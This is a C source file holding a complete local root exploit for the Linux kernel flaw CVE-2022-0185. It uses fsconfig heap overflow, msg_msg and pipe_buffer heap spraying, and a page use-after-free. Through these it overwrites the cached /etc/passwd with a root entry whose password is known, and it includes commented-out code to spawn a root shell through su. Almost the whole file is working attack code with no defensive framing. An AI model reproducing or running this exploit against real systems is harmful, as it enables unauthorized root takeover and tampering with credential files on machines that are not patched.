#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/mount.h>
#include <sys/prctl.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <poll.h>
#include <sched.h>





#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif



#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");



void leak(size_t *content,size_t size)
{
    printf("[*]Leak: ");
    for(int i=0;i<(int)(size/8);i++)
    {
       printf("%llx\n",content[i]);
    }
}

int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n",msg);
    exit(-1);
}


static inline int fsopen(const char *fs_name, unsigned int flags)
{
    return syscall(__NR_fsopen, fs_name, flags);
}

static inline int fsconfig(int fsfd, unsigned int cmd, 
             const char *key, const void *val, int aux)
{
    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);
}

/**
 * @brief make an out-of-bound write to the next object in kmalloc-4k,
 * note that the buf before will always be appended to a ",=",
 * for a ctx-legacy_data with 4095 bytes' data, the ',' will be the last byte,
 * and the '=' will always be on the first byte of the object nearby
 * 
 * @return int - the fd for filesystem context
 */
int prepare_oob_write(void)
{
    int fs_fd;

    /* get a filesystem context */
    fs_fd = fsopen("ext4", 0);
    if (fs_fd < 0) {
        errExit("FAILED to fsopen()!");
    }

    /**
     * fulfill the ctx->legacy_data to 4095 bytes, 
     * so that the (0x1000 - 2 - size) overflow
     */
    for (int i = 0; i < 255; i++) {
        fsconfig(fs_fd, FSCONFIG_SET_STRING, "Lotus77", "Lotus77", 0);
    }
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "Lotus777", "Lotus", 0);

    return fs_fd;    
}

#define MSG_NUM 0x100
#define MSG_SZ    (0x1000+0x20-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))
#define OOB_READ_SZ    (0x2000-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))
#define MSG_TYPE 0x41414141

#define PIPE_NUM MSG_NUM

int msqid[MSG_NUM];
int pipe_fd[PIPE_NUM][2];
int fs_fd, victim_qidx = -1;

/**
 * @brief We don't need to leak anything here, we just need to occupy a 4k obj.
 */



/* for pipe escalation */
#define SND_PIPE_BUF_SZ 96*2


int orig_pid, victim_pid = -1;
int snd_orig_pid = -1, snd_vicitm_pid = -1;
int self_2nd_pipe_pid = -1, self_3rd_pipe_pid = -1, self_4th_pipe_pid = -1;

struct list_head {
    uint64_t    next;
    uint64_t    prev;
};

struct msg_msg {
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg {
    uint64_t    next;
};


size_t find_page_addr(size_t *data)
{
    // leak(data,0x200);
    for(int idx=0;idx<(0xc00/8);idx+=(0xc0/8))
    {
        if(data[idx+5]>0xffff000000000000&&data[idx+6]==0x100000003&&data[idx+7]>0xffffffff81000000&&data[idx+8]==0&&data[idx]!=0xffffffffffffffff)
        {
            return idx;
        }
    }
    return -1;
}

// size_t find_normal_pipe(size_t *data,int pwd_page_idx)
// {
//     for(int idx=0;idx<0x100;idx++)
//     {
//         if(data[idx]>0xffff000000000000&&data[idx+1]!=0x100000000&&data[idx+2]>0xffffffff81000000&&data[idx+3]==0x10)
//         {
//             if(idx-pwd_page_idx>24||pwd_page_idx-idx>24)
//                 return idx;
//         }
//     }
//     return -1;
// }

int main(int argc, char **argv, char **envp)
{
    puts("[*] CVE-2022-0185 by Loτυs");

    puts("[*] touch some file for su pwd");
    system("echo \"Lotus\">/tmp/pwd");

    if (!fork()) {
        /* create new namespace to get CAP_SYS_ADMIN */
        if (unshare(CLONE_NEWNS | CLONE_NEWUSER) < 0) {
            errExit("FAILED to unshare()!");
        }

        cpu_set_t cpu_set;

        CPU_ZERO(&cpu_set);
        CPU_SET(0, &cpu_set);
        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);


    size_t buf[0x1000], ktext_leak = -1;

    int target_file_fd = open("/etc/passwd",0);
    if(target_file_fd<0)
    {
        errExit("Open passwd failed!");
    }

    puts("[*]Pipe Spraying...");
    for (int i = 0; i < PIPE_NUM; i++) {
        if (pipe(pipe_fd[i]) < 0) {
            printf("[x] Failed at creating %d pipe.\n", i);
            errExit("FAILED to create pipe!");
        }
    }

    puts("[*]4k msg_msg Spraying for once...");
    for (int i = 0; i < (MSG_NUM - 8); i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
            errExit("FAILED to create msg_queue!");
        }

        buf[0] = i;
        buf[MSG_SZ / 8] = i;
        if (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at writing %d queue.\n", i);
            errExit("FAILED to allocate msg_msg!");
        }
    }

    puts("[*] Allocating fs->legacy_data...");
    fs_fd = prepare_oob_write();

    puts("[*]4k msg_msg Spraying for twice...");
    for (int i = (MSG_NUM - 8); i < MSG_NUM; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
            errExit("FAILED to create msg_queue!");
        }

        buf[0] = i;
        buf[MSG_SZ / 8] = i;
        if (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at writing %d queue.\n", i);
            errExit("FAILED to allocate msg_msg!");
        }
    }


    puts("[*] fsconfig() to set the size to the &msg_msg->m_ts...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "3", "114514Lotus777114514", 0);

    puts("[*] fsconfig() to overwrite the msg_msg->m_ts...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", "\xc8\x1f", 0);

    puts("[*]Read from msg_msg to location the one...");
    for (int i = 0; i < MSG_NUM; i++) {
        ssize_t read_size;

        read_size = peek_msg(msqid[i], buf, OOB_READ_SZ, 0);
        if (read_size < 0) {
            printf("[x] Failed at reading %d msg_queue.\n", i);
            errExit("FAILED to read msg_msg!");
        } else if (read_size > MSG_SZ) {
            printf("\033[32m\033[1m[+] Found victim msg_msg at \033[0m"
                   "%d\033[32m\033[1m msg_queue!\033[0m\n", i);
            victim_qidx = i;
            break;
        }
    }

    if (victim_qidx == -1) {
        errExit("Msg_msg not hit!");
    }


    size_t buf2[0x8000];



    puts("[*] Allocating 4k pipe_buffer...");
    for (int i = (PIPE_NUM - 1); i >= 0; i--) 
    {
        if (i == victim_qidx) {
            continue;
        }

        if (read_msg(msqid[i], buf2, MSG_SZ, MSG_TYPE) < 0) {
            printf("[x] Failed at reading %d msg_queue.\n", i);
            errExit("FAILED to release msg_msg!");
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] Failed at extending %d pipe_buffer.\n", i);
            errExit("FAILED to extend pipe_buffer!");
        }

        write(pipe_fd[i][1], "Lotus777", 8);
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], "Lotus777", 8);
        write(pipe_fd[i][1], "Lotus777", 8);  
    }

    puts("[*] Overwriting pipe_buffer->page...");
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "77", "77", 0);
    for (int i = 0; i < ((0x1000 - 8 * 4) / 16); i++) {
        fsconfig(fs_fd, FSCONFIG_SET_STRING, "Lotus77", "Lotus77", 0);
    }

    for (int i = (PIPE_NUM - 1); i >= 0; i--) {
        char tmp[0x10];
        int nr;

        if (i == victim_qidx) {
            continue;
        }

        memset(tmp, '\0', sizeof(tmp));
        read(pipe_fd[i][0], tmp, 8);
        read(pipe_fd[i][0], &nr, sizeof(int));
        if (!strcmp(tmp, "Lotus777") && nr != i) {
            orig_pid = i;
            victim_pid = nr;
            break;
        }
    }

    if (victim_pid == -1) {
        errExit("FAILED to hit two pipe_buffer!");
    }

    BLUE printf("[+]Hit!:previous_page: %d, victim pipe:%d\n",orig_pid, victim_pid); CLOSE
    

    size_t pipe_buf[0x200];
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/0x28);



    memset(buf, '\0', sizeof(buf));

    /* let the page's ptr at pipe_buffer */
    write(pipe_fd[victim_pid][1], buf, SND_PIPE_BUF_SZ*0x10 - 24 - 3*sizeof(int));

    puts("[*]Uaf one of the pipe->page...");
    close(pipe_fd[orig_pid][0]);
    close(pipe_fd[orig_pid][1]);

    puts("[*] fcntl() to set the pipe_buffer on victim page...");
    for (int i = 0; i < PIPE_NUM; i++) 
    {
        if (i == victim_qidx) 
        {
            continue;
        }

        if (i == orig_pid || i == victim_pid) 
        {
            continue;
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) 
        {
            printf("[x] failed to resize %d pipe!\n", i);
            errExit("FAILED to re-alloc pipe_buffer!");
        }
    }

    size_t offset_in_file = 0;
    int retval = 0;
    

    for (int i = 1; i < PIPE_NUM; i+=2) {
        if (i == orig_pid || i == victim_pid) {
            continue;
        }
        offset_in_file = 3;
        retval = splice(target_file_fd, &offset_in_file, pipe_fd[i][1], NULL, 1, 0);
	    if (retval < 0)
        {
            printf("splice failed:%d!",i);
            return -1;
        }
		    
	    else if (retval == 0)
        {
            printf("short splice:%d!",i);
            return -1;
        }    
    }
    puts("\033[32m\033[1m[+] File splice done.\033[0m");
    
    //b *0xffffffff81314e20 t pipe_read
    //b *0xffffffff81315290 t pipe_write
    //b *0xffffffff8157fd3d call copyout
    //b *0xffffffff8157fba2 call copyin
    memset(pipe_buf, '\0', sizeof(pipe_buf));
    // sleep(4);
    read(pipe_fd[victim_pid][0], pipe_buf, 0xc00);
    // read(pipe_fd[victim_pid][0], pipe_buf, 40);


    puts("[*]find the pwd->page_addr...");
    
    int pwd_page_idx = find_page_addr(&pipe_buf);
    if(pwd_page_idx==-1)
    {// some condition else,maybe not to use the tmp page?
        memcpy(pipe_buf,(char*)pipe_buf+0xc0-0xc,0xc00-0xc0);
        pwd_page_idx = find_page_addr(&pipe_buf);
        size_t page_addr = pipe_buf[pwd_page_idx+0x5];
        if(page_addr<=0)
        {
            printf("[*]pwd->page_addr not found!\n");
            return -1;
        }

        BLUE printf("[*] pwd->page_addr:0x%llx\n",page_addr); CLOSE

        pipe_buf[pwd_page_idx]=page_addr;
        pipe_buf[pwd_page_idx+1]=0x400000000;
        pipe_buf[pwd_page_idx+3]=0x10;
        // pipe_buf[pwd_page_idx+5]=page_addr;
        pipe_buf[pwd_page_idx+6]=0x400000000;
        pipe_buf[pwd_page_idx+8]=0x10;

        // leak(pipe_buf+pwd_page_idx,0xc0);
        write(pipe_fd[victim_pid][1], pipe_buf+pwd_page_idx, 0xc0);
    }
    else
    {// to use the tmp page.
        size_t page_addr = pipe_buf[pwd_page_idx+0x5];
        if(page_addr<=0)
        {
            printf("[*]pwd->page_addr not found!\n");
            return -1;
        }

        BLUE printf("[*] pwd->page_addr:0x%llx\n",page_addr); CLOSE

        pipe_buf[pwd_page_idx]=page_addr;
        pipe_buf[pwd_page_idx+1]=0x400000000;
        pipe_buf[pwd_page_idx+3]=0x10;
        // pipe_buf[pwd_page_idx+5]=page_addr;
        pipe_buf[pwd_page_idx+6]=0x400000000;
        pipe_buf[pwd_page_idx+8]=0x10;

        // leak(pipe_buf+pwd_page_idx,0xc0);
        write(pipe_fd[victim_pid][1], pipe_buf+pwd_page_idx, 0xc0);
    }

    

// root::0:0:root:/root:/bin/bash
// daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
// bin:x:2:2:bin:/bin:/usr/sbin/nologin
// sys:x:3:3:sys:/dev:/usr/sbin/nologin
// sync:x:4:65534:sync:/bin:/bin/sync
// games:x:5:60:games:/usr/games:/usr/sbin/nologin
// man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
// lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
// mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
// news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
// uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
// proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
// www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
// backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
// list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
// irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
// gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
// nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
// _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
// systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
// systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
// sshd:x:103:65534::/run/sshd:/usr/sbin/nologin
// systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
// systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
// lotus:x:1000:1000::/home/lotus:/bin/sh
// Lotus:x:1001:1001::/home/Lotus:/bin/sh

    char *data = ":$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus
    printf("Setting root password to \"Lotus\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd page cache");
    //what we want to edit pipe->page
    for (int i = 0;i < PIPE_NUM; i++) {
        if (i == orig_pid|| i == victim_pid) {
            continue;
        }
        int retval = write(pipe_fd[i][1], data,data_size);
            if (retval < 0)
            {
                printf("Write failed:%d!",i);
                return -1;
            }
            else if (retval < data_size)
                {
                    printf("short write:%d!",i);
                return -1;
                }
        }
    puts("[*]Now the pwd is:");
    system("cat /etc/passwd");
    // char *cmd[] = {"/bin/sh", "-c", "cat /tmp/pwd | su - -c \""
    //             "echo \\\"Done! Popping shell... (run commands now)\\\";"
    //             "/bin/sh;"
    //         "\" root"};

    // execv("/bin/sh", cmd);

    } 
    return 0;
}